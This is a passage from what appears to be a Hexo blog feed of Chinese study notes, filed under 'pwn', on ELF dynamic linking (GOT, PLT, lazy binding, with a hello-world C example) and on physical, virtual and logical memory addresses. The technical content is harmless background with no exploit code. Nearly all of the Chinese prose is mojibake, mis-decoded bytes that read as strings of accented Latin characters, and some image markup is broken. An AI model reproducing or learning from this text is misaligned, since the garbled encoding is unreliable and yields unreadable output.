Tableï¼‰ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨ç¬¦å·çš„ç»å¯¹åœ°å€å³è¿è¡Œæ—¶ç¬¦å·çš„çœŸå®åœ°å€ï¼Œç”±é“¾æ¥å™¨è¿›è¡Œå¡«å……ï¼ŒåŒ…å«åŠ¨æ€é“¾æ¥çš„å‡½æ•°çš„åœ°å€ã€‚</li><li><code>.plt</code>ï¼šè¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œå°±æ˜¯ä¸€å°æ®µè·³è½¬æŒ‡ä»¤ï¼Œå­˜æœ‰ä»<code>.got.plt</code>ä¸­æŸ¥æ‰¾å¤–éƒ¨å‡½æ•°åœ°å€çš„ä»£ç ï¼Œè‹¥æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œåˆ™ä¼šè§¦å‘é“¾æ¥å™¨è§£æå‡½æ•°åœ°å€å¹¶å¡«å……åœ¨<code>.got.plt</code>ç›¸åº”çš„ä½ç½®ï¼›è‹¥å‡½æ•°åœ°å€å·²ç»å­˜å‚¨åœ¨<code>.got.plt</code>ä¸­åˆ™ç›´æ¥è·³è½¬åˆ°å¯¹åº”åœ°å€ç»§ç»­æ‰§è¡Œã€‚</li><li><code>.got.plt</code>ï¼šæ˜¯pltçš„gotã€‚å®ƒåŒ…å«è¿”å›.pltå»è§¦å‘æŸ¥æ‰¾çš„åœ°å€ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªç»è¿‡æŸ¥æ‰¾åå¡«å……çš„æ­£ç¡®ç¬¦å·åœ°å€ã€‚</li><li><code>.plt.got</code>ï¼šä¸çŸ¥é“å¹²å•¥ç”¨çš„â€¦â€¦</li></ul><h3 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h3><p>å› ä¸ºé™æ€é“¾æ¥ä¸­çš„é‡å®šä½å·¥ä½œå…¨éƒ¨åœ¨è¿è¡Œæ—¶å®Œæˆï¼Œä¸”å½“æˆ‘ä»¬å¼•ç”¨äº†æŸä¸€ä¸ªåº“ï¼Œç¨‹åºå°†ä¼šå¯¹å…¶ä¸­çš„æ‰€æœ‰å‡½æ•°å’Œå…¨å±€å˜é‡è¿›è¡Œé‡å®šä½ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œé“¾æ¥çš„åŠ¨æ€åº“è¶Šå¤§é“¾æ¥çš„æ—¶é—´å°±è¶Šé•¿ï¼Œç³»ç»Ÿçš„å¯åŠ¨æ—¶é—´å°±è¶Šé•¿ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå»¶è¿Ÿç»‘å®šçš„æ¦‚å¿µè¢«æå‡ºã€‚å»¶è¿Ÿç»‘å®šè§„å®šåªæœ‰ç¬¦å·çœŸæ­£è¢«å¼•ç”¨æ—¶æ‰ä¼šè¿›è¡Œé‡å®šä½ï¼Œè€Œä¸æ˜¯åœ¨åˆšå¼€å§‹å°±å¯¹æ‰€æœ‰çš„åŠ¨æ€ç¬¦å·è¿›è¡Œé‡å®šä½ã€‚</p><p>å»¶è¿Ÿç»‘å®šç”±pltæ¥å®ç°ï¼Œåœ¨elfæ–‡ä»¶ä¸­ï¼Œpltè¡¨å’Œgotè¡¨å‡ ä¹æ—¶æ—¶åˆ»åˆ»ä¼´éšç€<del>ï¼ˆè¿™æ˜¯å¯ä»¥å—‘çš„å—æ˜¯å¯ä»¥çš„å—ï¼‰</del>ã€‚</p><p>åœ¨gotè¡¨ä¸­ï¼Œå‰ä¸‰é¡¹å†…å®¹ä¸å¯¹åº”ç¬¦å·çš„å¼•ç”¨ï¼Œåˆ†åˆ«å¯¹åº”ï¼š</p><ul><li>got[0]ï¼šå½“å‰çš„elfæ–‡ä»¶ä¸­.synamicæ®µçš„åœ°å€</li><li>got[1]ï¼šä¿ç•™</li><li>got[2]ï¼šåŠ¨æ€é“¾æ¥å™¨çš„ç¬¦å·è§£æå‡½æ•°</li></ul><p>å…¶ä½™çš„é¡¹è¢«ç”¨ä½œç¬¦å·é‡å®šä½ï¼Œå¯¹äºå¤–éƒ¨å‡½æ•°(å³å¤–éƒ¨è·³è½¬)çš„ got è¡¨é¡¹è€Œè¨€ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µä¿å­˜çš„æ˜¯ .plt è¡¨çš„èµ·å§‹ä½ç½®ï¼Œå¯¹äºæ•°æ®å¼•ç”¨çš„ plt è¡¨é¡¹è€Œè¨€ï¼Œç¼–è¯‘é˜¶æ®µçš„å€¼ä¸º 0ã€‚</p><p>plt çš„ä½œç”¨æ˜¯ä¸ºæ¯ä¸€æ¬¡æ¨¡å—å¤–éƒ¨çš„å‡½æ•°è°ƒç”¨è®¾ç½®ä¸€å°æ®µè·³è½¬ä»£ç ã€‚åœ¨ arm ç¼–è¯‘å™¨çš„å®ç°ä¸­ï¼Œå¯¹äºæ¯ä¸€é¡¹å¤–éƒ¨è·³è½¬ï¼Œå¯¹åº” plt ä¸­ä¸‰æ¡æŒ‡ä»¤ã€‚å’Œ got ç±»ä¼¼ï¼Œplt çš„å‰é¢éƒ¨åˆ†ä¹Ÿè¢«ç³»ç»Ÿâ€å¾ç”¨â€äº†ï¼Œè¿™éƒ¨åˆ†è´Ÿè´£è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ä¸­çš„ç¬¦å·è§£æå‡½æ•°å®ŒæˆåŠ¨æ€è§£æå·¥ä½œï¼Œåç»­çš„éƒ¨åˆ†æ‰æ˜¯å¯¹åº”å…·ä½“å¤–éƒ¨è·³è½¬çš„æŒ‡ä»¤ã€‚</p><p>åœ¨ç¨‹åºçš„ç¼–è¯‘é˜¶æ®µï¼Œplt è·³è½¬æŒ‡ä»¤è¡¨é¡¹å’Œ got è¡¨é¡¹å°±å®ç°äº†ç»‘å®šï¼Œå…¶æ˜ å°„å…³ç³»ä¸ºï¼šplt ç¬¬ä¸€æ®µè·³è½¬æŒ‡ä»¤å¯¹åº” got ç¬¬å››ä¸ªè¡¨é¡¹ï¼Œplt ç¬¬äºŒæ®µè·³è½¬æŒ‡ä»¤å¯¹åº” got ç¬¬äº”ä¸ªè¡¨é¡¹ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-33-10.png"></p><p>ğŸŒ°ï¼š<br>å¯¹äºä¸€ä¸ªcè¯­è¨€æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world1!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world2!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹å…¶è¿›è¡Œç¼–è¯‘åæŸ¥çœ‹å…¶mainå‡½æ•°çš„åæ±‡ç¼–ç»“æœ</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_16-58-54.png"></p><blockquote><p>%ripæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæ­¤å¤„ç›¸å½“äºå¯„å­˜å™¨ç›¸å¯¹å¯»å€</p></blockquote><p>åœ¨<code>0x40054d</code>è°ƒç”¨äº†<code>0x400430&lt;puts@plt&gt;</code>ï¼Œå½“ç¨‹åºripåˆ°400340æ—¶ï¼Œéœ€è¦æ‰§è¡Œçš„æ“ä½œå¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸ºï¼š</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-00-02.png"></p><hr><p>é™†é™†ç»­ç»­æŠŠåŸºç¡€çš„å°é›¶ç¢å­¦å®Œå•¦ï¼ğŸ¥³</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€å’Œé€»è¾‘åœ°å€</title>
    <link href="/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>å…³äºç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€å’Œé€»è¾‘åœ°å€çš„å®šä¹‰å’Œä¹‹é—´çš„å…³ç³»</p><span id="more"></span><p>è™½ç„¶å†™äº†è¿™ä¹ˆå¤šçŸ¥è¯†ç‚¹ä½†è„‘è¢‹è¿˜æ˜¯ä¹±ä¹±çš„ï¼Œå¸Œæœ›å“ªå¤©çªç„¶å¼€çªå­ğŸ¥±</p><h3 id="ç†è§£å†…å­˜"><a href="#ç†è§£å†…å­˜" class="headerlink" title="ç†è§£å†…å­˜"></a>ç†è§£å†…å­˜</h3><p>æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çš„å„ç§æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ç­‰å­˜å‚¨å™¨ä¸Šï¼Œä½†ç¡¬ç›˜çš„è¿è¡Œé€Ÿåº¦å¾ˆæ…¢ã€‚æ‰€ä»¥éœ€è¦è¿è¡Œç¨‹åºæˆ–è€…ä½¿ç”¨æ•°æ®æ—¶ï¼Œè¿™äº›æ•°æ®å¿…é¡»ä»ç¡¬ç›˜ä¸Šè½¬åˆ°å¦ä¸€ç§å®¹é‡å°ä½†é€Ÿåº¦å¿«å¾ˆå¤šçš„å­˜å‚¨å™¨ï¼Œä¹‹åæ‰é€è¿›CPUè¿›è¡Œå¤„ç†ã€‚è¿™ä¸­é—´çš„å­˜å‚¨å™¨å°±æ˜¯å†…å­˜ã€‚</p><p>æ— è®ºä½•ç§å­˜å‚¨å™¨ï¼Œè½¯ç›˜ã€ç¡¬ç›˜ã€å…‰ç›˜æˆ–è€…å†…å­˜ï¼Œéƒ½æœ‰åœ°å€ã€‚</p><p>å…¶ä¸­ï¼š</p><ul><li>æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜åœ°å€å«åš<strong>è™šæ‹Ÿå†…å­˜åœ°å€</strong>ï¼ˆ<em>Virtual Memory Address</em>ï¼‰</li><li>å®é™…å­˜åœ¨ç¡¬ä»¶é‡Œé¢çš„ç©ºé—´åœ°å€å«<strong>ç‰©ç†å†…å­˜åœ°å€</strong>ï¼ˆ<em>Physical Memory Address</em>ï¼‰ã€‚</li></ul><h1 id="ç‰©ç†åœ°å€"><a href="#ç‰©ç†åœ°å€" class="headerlink" title="ç‰©ç†åœ°å€"></a>ç‰©ç†åœ°å€</h1><p><strong>ç‰©ç†åœ°å€å°±æ˜¯å¸¸è¯´çš„å†…å­˜åœ°å€ï¼Œæ˜¯å†…å­˜å½“ä¸­å­˜å‚¨æ•°æ®çš„ä¸€ä¸ªæ ‡è¯†ï¼Œå¹¶ä¸æ˜¯æ•°æ®æœ¬èº«ï¼Œé€šè¿‡å†…å­˜åœ°å€å¯ä»¥æ‰¾åˆ°å†…å­˜å½“ä¸­å­˜å‚¨çš„æ•°æ®ã€‚</strong></p><p>è®¡ç®—æœºå°†å†…å­˜åˆ’åˆ†ä¸ºä¸€ä¸ªä¸ªå°çš„å†…å­˜å•å…ƒï¼ŒåŒæ—¶å¯¹å…¶ç¼–å·ï¼Œè¿™æ ·å°±èƒ½æœ‰æ•ˆç®¡ç†å†…å­˜ã€‚åœ¨ç©ºé—´åˆ’åˆ†å®è·µä¸­ï¼Œä¸€ä¸ª<strong>å†…å­˜å•å…ƒ</strong>çš„å¤§å°ä¸º1<strong>å­—èŠ‚</strong>ã€‚ä¸€ä¸ªå­—èŠ‚æ˜¯å…«ä¸ªæ¯”ç‰¹ï¼Œç›¸å½“äºå…«ä¸ªäºŒè¿›åˆ¶ä½ï¼Œä¸¤ä¸ªåå…­è¿›åˆ¶ä½ã€‚</p><blockquote><p>å¯ä»¥ç†è§£ä¸ºä¸€æ ‹å«å†…å­˜çš„æ¥¼ï¼Œæ¯ä¸€å¥—å•†å“æˆ¿éƒ½æœ‰è‡ªå·±çš„é—¨ç‰Œå·å«å†…å­˜å•å…ƒï¼Œæ¯ä¸€ä¸ªå®¶åº­æ˜¯ä¸€ä¸ªæ•°æ®ï¼Œæ¯ä¸€ä½å®¶åº­æˆå‘˜æ‰€å±…ä½çš„å°æˆ¿é—´åˆ™ä¸ä¼šè¿›è¡Œç¼–å·ã€‚</p></blockquote><p>æ¯ä¸ªå†…å­˜å•å…ƒéƒ½æœ‰ç¼–å·ï¼ˆå†…å­˜ç¼–å·ï¼‰ï¼Œå†…å­˜ç¼–å·å¯ä»¥ç§°ä¸º<strong>åœ°å€</strong>ï¼Œåœ¨<code>C</code>è¯­è¨€ä¸­ä¹Ÿç§°ä¸º<strong>æŒ‡é’ˆ</strong>ã€‚</p><h5 id="ğŸŒ°"><a href="#ğŸŒ°" class="headerlink" title="ğŸŒ°"></a>ğŸŒ°</h5><p>åœ¨å†…å­˜ä¸­å­˜å‚¨â€ä¿®é¥°ç¬¦â€œæˆ–â€MODâ€œï¼Œå¯ä»¥ç¤ºæ„ä¸ºï¼š</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-28_20-14-36.png"></p><p>![]&#x2F;img&#x2F;ç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€å’Œé€»è¾‘åœ°å€&#x2F;Snipaste_2023-03-28_20-23-49.png)</p><blockquote><p>æ•°å­—åé¢åŠ Hè¡¨ç¤ºåå…­è¿›åˆ¶</p></blockquote><p>åœ¨ç¬¬ä¸€è¡Œä¸­ï¼Œæ¯ä¸€æ ¼è¡¨ç¤ºä¸€æ®µå†…å­˜ï¼Œè€Œæ ¼å­é‡Œçš„å†…å®¹æ˜¯è¿™æ®µå†…å®¹è®°ä¸‹çš„æ•°æ®ï¼›ç¬¬äºŒè¡Œä¸­æ¯ä¸€æ ¼å†…æ•°å­—å°±æ˜¯å¯¹åº”çš„å†…å­˜çš„åœ°å€ã€‚</p><p>æ±‰å­—åœ¨ä¸€ä¸ªåœ°å€ç©ºé—´é‡Œå‚¨å­˜ä¸ä¸‹ï¼Œä¼šæ”¾è¿›ä¸¤ä¸ªè¿ç»­çš„åœ°å€ç©ºé—´é‡Œã€‚è€Œå­—æ¯æˆ–è€…é˜¿æ‹‰ä¼¯æ•°å­—å°±å¯ä»¥æ”¾è¿›ä¸€ä¸ªå†…å­˜åœ°å€é‡Œã€‚åœ¨ä¸Šå›¾ä¸­ï¼Œâ€ä¿®â€œçš„å†…å­˜åœ°å€ä¸º1000Hï¼Œæˆ–è€…Mçš„å†…å­˜åœ°å€ä¸ºâ€1000Hâ€ã€‚</p><h1 id="è™šæ‹Ÿåœ°å€"><a href="#è™šæ‹Ÿåœ°å€" class="headerlink" title="è™šæ‹Ÿåœ°å€"></a>è™šæ‹Ÿåœ°å€</h1><p>è™šæ‹Ÿå­˜å‚¨å™¨ä¸æ˜¯ä»»ä½•å®é™…çš„ç‰©ç†å­˜å‚¨å™¨ï¼Œè€Œæ˜¯å€ŸåŠ©ç£ç›˜ç­‰è¾…åŠ©å­˜å‚¨å™¨æ¥æ‰©å¤§ä¸»å­˜å®¹é‡ï¼Œä½¿ä¹‹ä¸ºæ›´å¤§æˆ–æ›´å¤šçš„ç¨‹åºæ‰€ä½¿ç”¨ã€‚</p><p><strong>è™šæ‹Ÿåœ°å€ç”¨äºæŒ‡ç¤ºè™šæ‹Ÿå­˜å‚¨å™¨çš„åœ°å€ï¼Œå®ƒæ˜¯ç”¨é€»è¾‘åœ°å€æŒ‡ç¤ºçš„</strong></p><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿›ç¨‹ä¸ç‰©ç†åœ°å€æ˜ å°„èµ·æ¥ï¼Œæ‰èƒ½åŒºåˆ†è¿™äº›å†…å­˜ä¸­å­˜å‚¨çš„æ•°æ®å±äºå“ªä¸ªè¿›ç¨‹ã€‚ä½†å†…å­˜å¤§å°æœ‰é™ï¼Œè¿›ç¨‹å´å¯ä»¥å¾ˆå¤šï¼Œç”šè‡³å¯èƒ½åŒæ—¶è¿›è¡Œå¤šä¸ªè¿›ç¨‹ã€‚ä¸ºäº†å®ç°è®©å¾ˆå¤šè¿›ç¨‹å…±ç”¨ä¸€ä¸ªå­˜å‚¨èµ„æºæœ‰é™çš„å†…å­˜ï¼Œæˆ‘ä»¬å¼•å‡ºè™šæ‹Ÿåœ°å€çš„æ¦‚å¿µï¼Œæˆ‘ä»¬å…ˆå°†è¿›ç¨‹ä¸è™šæ‹Ÿåœ°å€æ˜ å°„èµ·æ¥ï¼Œå†å°†è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€æ˜ å°„èµ·æ¥ã€‚</p><p>æ“ä½œç³»ç»Ÿå¼•å…¥äº†è™šæ‹Ÿå†…å­˜ï¼Œè¿›ç¨‹æŒæœ‰çš„è™šæ‹Ÿåœ°å€ä¼šé€šè¿‡ CPU èŠ¯ç‰‡ä¸­çš„å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰çš„æ˜ å°„å…³ç³»ï¼Œæ¥è½¬æ¢å˜æˆç‰©ç†åœ°å€ï¼Œç„¶åå†é€šè¿‡ç‰©ç†åœ°å€è®¿é—®å†…å­˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-0204ff048148735a260fa5f94f475f14_r.png"></p><h1 id="é€»è¾‘åœ°å€"><a href="#é€»è¾‘åœ°å€" class="headerlink" title="é€»è¾‘åœ°å€"></a>é€»è¾‘åœ°å€</h1><p>é€»è¾‘åœ°å€ï¼Œå°±æ˜¯æŒ‡æœºå™¨è¯­è¨€æŒ‡ä»¤ä¸­ç”¨æ¥æŒ‡å®šä¸€ä¸ªæ“ä½œæ•°æˆ–ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œ<strong>ç”±ä¸€ä¸ªæ®µ(segment)å’Œåç§»é‡(offset)ç»„æˆ</strong>ï¼Œè¯´åœ°ç›´ç™½ç‚¹å°±æ˜¯CPUæ‹¿åˆ°çš„åœ°å€ã€‚</p><p>æ®µå·ï¼šç”¨æ¥æŸ¥æ‰¾æ®µçš„èµ·å§‹åœ°å€ï¼Œå®ƒè¢«å­˜å‚¨åœ¨æ®µå¯„å­˜å™¨å½“ä¸­</p><p>åç§»åœ°å€ï¼šæ˜¯å­˜å‚¨å•å…ƒçš„ç‰©ç†åœ°å€ä¸æ‰€åœ¨èµ·å§‹æ®µçš„å·®å€¼</p><h1 id="å„ç§å†…å­˜çš„å…³ç³»"><a href="#å„ç§å†…å­˜çš„å…³ç³»" class="headerlink" title="å„ç§å†…å­˜çš„å…³ç³»"></a>å„ç§å†…å­˜çš„å…³ç³»</h1><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/bba9443a9c0249ffa501df86649ce5d8.png"></p><h2 id="è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€"><a href="#è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€" class="headerlink" title="è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€"></a>è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€</h2><h3 id="å†…å­˜åˆ†æ®µ"><a href="#å†…å­˜åˆ†æ®µ" class="headerlink" title="å†…å­˜åˆ†æ®µ"></a>å†…å­˜åˆ†æ®µ</h3><p>ç¨‹åºæ˜¯ç”±è‹¥å¹²ä¸ªé€»è¾‘åˆ†æ®µç»„æˆçš„ï¼Œå¦‚å¯ç”±ä»£ç åˆ†æ®µã€æ•°æ®åˆ†æ®µã€æ ˆæ®µã€å †æ®µç»„æˆã€‚ä¸åŒçš„æ®µæ˜¯æœ‰ä¸åŒçš„å±æ€§çš„ï¼Œæ‰€ä»¥å°±ç”¨åˆ†æ®µï¼ˆSegmentationï¼‰çš„å½¢å¼æŠŠè¿™äº›æ®µåˆ†ç¦»å‡ºæ¥ã€‚</p><p>åˆ†æ®µæœºåˆ¶ä¸‹çš„è™šæ‹Ÿåœ°å€ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œ<strong>æ®µé€‰æ‹©å­</strong>å’Œ<strong>æ®µå†…åç§»é‡</strong>ã€‚</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><h4 id="æ®µé€‰æ‹©å­"><a href="#æ®µé€‰æ‹©å­" class="headerlink" title="æ®µé€‰æ‹©å­"></a>æ®µé€‰æ‹©å­</h4><p>æ®µé€‰æ‹©å­ä¿å­˜åœ¨å¯„å­˜å™¨é‡Œã€‚æ®µé€‰æ‹©å­æœ€é‡è¦çš„æ˜¯æ®µå·ï¼Œç”¨ä½œæ®µè¡¨çš„ç´¢å¼•ã€‚æ®µè¡¨é‡Œä¿å­˜çš„æ˜¯è¿™ä¸ªæ®µçš„åŸºåœ°å€ã€æ®µçš„ç•Œé™å’Œç‰¹æƒç­‰çº§ç­‰ã€‚</p><p>æ®µé€‰æ‹©å­æ˜¯åå…­ä½çš„ï¼Œå…¶ä¸­åå››ä½è¡¨ç¤ºåœ°å€ä¿¡æ¯</p><h4 id="æ®µåç§»é‡"><a href="#æ®µåç§»é‡" class="headerlink" title="æ®µåç§»é‡"></a>æ®µåç§»é‡</h4><p>åç§»é‡å®šä¹‰ä¸ºï¼šæŠŠå­˜å‚¨å•å…ƒçš„<strong>å®é™…åœ°å€</strong>ä¸å…¶æ‰€åœ¨æ®µçš„<strong>æ®µåœ°å€</strong>ä¹‹é—´çš„è·ç¦»ç§°ä¸ºæ®µå†…åç§»ï¼Œä¹Ÿç§°ä¸ºâ€œæœ‰æ•ˆåœ°å€â€æˆ–â€œåç§»é‡â€ã€‚</p><p>è™šæ‹Ÿåœ°å€ä¸­çš„æ®µåç§»é‡åº”è¯¥ä½äº0å’Œæ®µç•Œé™ä¹‹é—´ã€‚å¦‚æœæ®µå†…åç§»é‡æ˜¯åˆæ³•çš„ï¼Œå°±å°†å…¶æ®µåŠåœ°å€åŠ åˆ°æ®µå†…åç§»é‡å¾—åˆ°ç‰©ç†å†…å­˜åœ°å€ã€‚</p><p>åˆ†æ®µæœºåˆ¶ä¼šæŠŠç¨‹åºçš„è™šæ‹Ÿåœ°å€åˆ†æˆ 4 ä¸ªæ®µï¼Œæ¯ä¸ªæ®µåœ¨æ®µè¡¨ä¸­æœ‰ä¸€ä¸ªé¡¹ï¼Œåœ¨è¿™ä¸€é¡¹æ‰¾åˆ°æ®µçš„åŸºåœ°å€ï¼Œå†åŠ ä¸Šåç§»é‡ï¼Œäºæ˜¯å°±èƒ½æ‰¾åˆ°ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ã€‚</p><h4 id="å­˜åœ¨çš„é—®é¢˜"><a href="#å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="å­˜åœ¨çš„é—®é¢˜"></a>å­˜åœ¨çš„é—®é¢˜</h4><ul><li>å†…å­˜ç¢ç‰‡</li></ul><p>ä¸¾ä¾‹æ¥è¯´ã€‚å‡è®¾æˆ‘ä»¬ç°åœ¨å æœ‰ 1G çš„ç‰©ç†å†…å­˜ï¼Œç”¨æˆ·æ‰§è¡Œäº†å¤šä¸ªç¨‹åºï¼Œæ¸¸æˆå ç”¨äº† 512MB å†…å­˜ï¼Œæµè§ˆå™¨å ç”¨äº† 128MB å†…å­˜ï¼ŒéŸ³ä¹å ç”¨äº† 256 MB å†…å­˜ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å…³é—­æµè§ˆå™¨ï¼Œåˆ™ç©ºé—²å†…å­˜è¿˜æœ‰ 1024 - 512 - 256 &#x3D; 256MBã€‚ä½†å¦‚æœè¿™ä¸ª 256MB ä¸æ˜¯è¿ç»­çš„ï¼Œè¢«åˆ†æˆäº†ä¸¤æ®µ 128 MB å†…å­˜ï¼Œè¿™å°±ä¼šå¯¼è‡´æ²¡æœ‰ç©ºé—´å†æ‰“å¼€ä¸€ä¸ª 200MB çš„ç¨‹åºã€‚</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><p>è¿™é‡Œçš„å†…å­˜ç¢ç‰‡çš„é—®é¢˜å…±æœ‰ä¸¤å¤„åœ°æ–¹ï¼š</p><p>å¤–éƒ¨å†…å­˜ç¢ç‰‡ï¼Œä¹Ÿå°±æ˜¯äº§ç”Ÿäº†å¤šä¸ª<strong>ä¸è¿ç»­</strong>çš„å°ç‰©ç†å†…å­˜ï¼Œå¯¼è‡´æ–°çš„ç¨‹åºæ— æ³•è¢«è£…è½½ï¼›</p><p>å†…éƒ¨å†…å­˜ç¢ç‰‡ï¼Œç¨‹åºæ‰€æœ‰çš„å†…å­˜éƒ½è¢«è£…è½½åˆ°äº†ç‰©ç†å†…å­˜ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºæœ‰éƒ¨åˆ†çš„å†…å­˜å¯èƒ½å¹¶ä¸æ˜¯å¾ˆå¸¸ä½¿ç”¨ï¼Œè¿™ä¹Ÿä¼šå¯¼è‡´<strong>å†…å­˜çš„æµªè´¹</strong></p><ul><li>å†…å­˜äº¤æ¢æ•ˆç‡ä½</li></ul><p>å¯¹äºå¤–éƒ¨å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œæˆ‘ä»¬é‡‡ç”¨å†…å­˜äº¤æ¢çš„è§£å†³æªæ–½ã€‚</p><p>å¯ä»¥æŠŠéŸ³ä¹ç¨‹åºå ç”¨çš„é‚£ 256MB å†…å­˜å†™åˆ°ç¡¬ç›˜ä¸Šï¼Œç„¶åå†ä»ç¡¬ç›˜ä¸Šè¯»å›æ¥åˆ°å†…å­˜é‡Œã€‚ä¸è¿‡å†è¯»å›çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸èƒ½è£…è½½å›åŸæ¥çš„ä½ç½®ï¼Œè€Œæ˜¯ç´§ç´§è·Ÿç€é‚£å·²ç»è¢«å ç”¨äº†çš„ 512MB å†…å­˜åé¢ã€‚è¿™æ ·å°±èƒ½ç©ºç¼ºå‡ºè¿ç»­çš„ 256MB ç©ºé—´ï¼Œäºæ˜¯æ–°çš„ 200MB ç¨‹åºå°±å¯ä»¥è£…è½½è¿›æ¥ã€‚</p><p>å¯¹äºå¤šè¿›ç¨‹çš„ç³»ç»Ÿæ¥è¯´ï¼Œç”¨åˆ†æ®µçš„æ–¹å¼ï¼Œå†…å­˜ç¢ç‰‡æ˜¯å¾ˆå®¹æ˜“äº§ç”Ÿçš„ï¼Œäº§ç”Ÿäº†å†…å­˜ç¢ç‰‡ï¼Œé‚£ä¸å¾—ä¸é‡æ–°é‡æ–°è§„åˆ’å†…å­˜åŒºåŸŸï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šäº§ç”Ÿæ€§èƒ½ç“¶é¢ˆã€‚</p><p>å› 